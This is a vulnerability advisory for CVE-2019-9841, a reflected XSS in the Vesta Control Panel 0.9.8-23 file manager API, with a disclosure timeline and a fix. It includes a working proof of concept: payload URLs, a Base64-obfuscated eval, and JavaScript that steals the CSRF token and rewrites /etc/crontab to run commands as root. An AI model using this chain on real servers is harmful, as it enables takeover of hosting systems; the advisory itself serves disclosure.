---
title: '[CVE-2019-9841] Vesta Control Panel 0.9.8-23 — Reflected XSS in file manager API'
description: The insufficient output sanitization and inappropriate content type of the responses of the file manager API allows to run arbitrary JavaScript code in the context of the web application.
tags: [CVE, Vesta Control Panel, XSS]
advisory:
  discovered: 2019-03-13
  product:
    name: Vesta Control Panel
    url: https://vestacp.com/
  versions:
    - 0.9.8-23
  tested_versions_only: false
  cve: CVE-2019-9841
---

## Abstract

The insufficient output sanitization and inappropriate content type of the responses of the file manager API allows to run arbitrary JavaScript code in the context of the web application. This allows an attacker to impersonate the users of the control panel by tricking them to follow a specially crafted link while authenticated to the web application.

VestaCP users are actual system users and they have the right to manage several services on the hosting server, for example they can create and manage new databases, edit their own crontab, create and manage new mail accounts, etc. They are created by the administrator to whom VestaCP grants full access. This means that triggering the XSS from an administration session could allow an attacker to obtain root access on the hosting server.

## Details

A PHP script located at `/file_manager/fm_api.php` supposedly provides the API for the file managers plugins that can be installed in VestaCP. The script performs the requested operation then returns the result as a JSON string using `text/html` as the content type, often including an error message that reflects some of the provided arguments. By triggering an error using arguments that include a specially crafted HTTP payload it is possible to run arbitrary JavaScript code. For example:

```
https://target.com:8083/file_manager/fm_api.php?action=check_file_type&dir=<img+src=x+onerror=alert(1)+/>
```

Produces:

```json
{"result":false,"message":"Error: invalid path \/home\/admin\/<img src=x onerror=alert(1) \/>"}
```

Since the output is a JSON string, some characters are `\`-escaped. It is possible to overcome this limitation by deploying the payload as a Base64 string, for example the above is equivalent to:

```
https://target.com:8083/file_manager/fm_api.php?action=check_file_type&dir=<img+src=x+onerror=eval(atob('YWxlcnQoMSk='))+/>
```

This works out-of-the-box with Firefox and Edge, while Safari and Chrome block the script execution as they detect a possible XSS attempt. Hopefully some smarter payload will be able to bypass their XSS auditors.

## PoC: from XSS to root access

VestaCP acts as a wrapper around several system-level operations, the easiest way for an administrator to run a command as `root` is probably to alter the `/etc/crontab` file via the `/edit/server/cron/` page.

For example this cron job creates a file in the web server root as superuser:

```
* * * * * root id >/usr/local/vesta/web/proof
```

Most of the pages in the VestaCP web application employ a CSRF token, so in order to submit the POST form, the token must be obtained by parsing the HTML.

The following JavaScript function replaces `/etc/crontab` and restarts the cron daemon:

```js
(async () => {
    // fetch the CSRF token
    const request = await fetch('/', {credentials: 'include'});
    const text = await request.text();
    const token = text.match(/token="([^"]+)"/)[1];

    // prepare the payload
    const payload = 'id >/usr/local/vesta/web/proof';
    const config = encodeURIComponent(`* * * * * root ${payload}\n`);

    // replace the cron config file
    fetch('/edit/server/cron/', {
        credentials: 'include',
        method: 'POST',
        headers: {
            'content-type': 'application/x-www-form-urlencoded'
        },
        body: `token=${token}&v_config=${config}&v_restart=on&save=Save`
    });
})();
```

For completeness, this is the URL that the victim administrator needs to follow in order to trigger the PoC:

<!-- C-u M-| terser | base64 -w0 | sed 's/+/%2b/g' -->

```
https://target.com:8083/file_manager/fm_api.php?action=check_file_type&dir=<img+src=x+onerror=eval(atob('KGFzeW5jKCk9Pntjb25zdCByZXF1ZXN0PWF3YWl0IGZldGNoKCIvIix7Y3JlZGVudGlhbHM6ImluY2x1ZGUifSk7Y29uc3QgdGV4dD1hd2FpdCByZXF1ZXN0LnRleHQoKTtjb25zdCB0b2tlbj10ZXh0Lm1hdGNoKC90b2tlbj0iKFteIl0rKSIvKVsxXTtjb25zdCBwYXlsb2FkPSJpZCA%2bL3Vzci9sb2NhbC92ZXN0YS93ZWIvcHJvb2YiO2NvbnN0IGNvbmZpZz1lbmNvZGVVUklDb21wb25lbnQoYCogKiAqICogKiByb290ICR7cGF5bG9hZH1cbmApO2ZldGNoKCIvZWRpdC9zZXJ2ZXIvY3Jvbi8iLHtjcmVkZW50aWFsczoiaW5jbHVkZSIsbWV0aG9kOiJQT1NUIixoZWFkZXJzOnsiY29udGVudC10eXBlIjoiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIn0sYm9keTpgdG9rZW49JHt0b2tlbn0mdl9jb25maWc9JHtjb25maWd9JnZfcmVzdGFydD1vbiZzYXZlPVNhdmVgfSl9KSgpOwo='))+/>
```

After one minute check that the proof file is created in the web server root:

```console
$ curl -k https://target.com:8083/proof
uid=0(root) gid=0(root) groups=0(root)
```

## Timeline

2019-03-15
: Disclosed to the VestaCP team.

2019-03-15
: MITRE assigns [CVE-2019-9841][cve] to this vulnerability.

2019-04-12
: The VestaCP team [fixes](https://github.com/serghey-rodin/vesta/commit/c28c5d29a3c61bc8110c11349e3f2309cd537cfa) the vulnerability.

2019-04-15
: The VestaCP team [releases](https://github.com/serghey-rodin/vesta/commit/e674bf14fd401f419223f1dd06a6e381a3c188a2) version 0.9.8-24.

[cve]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9841
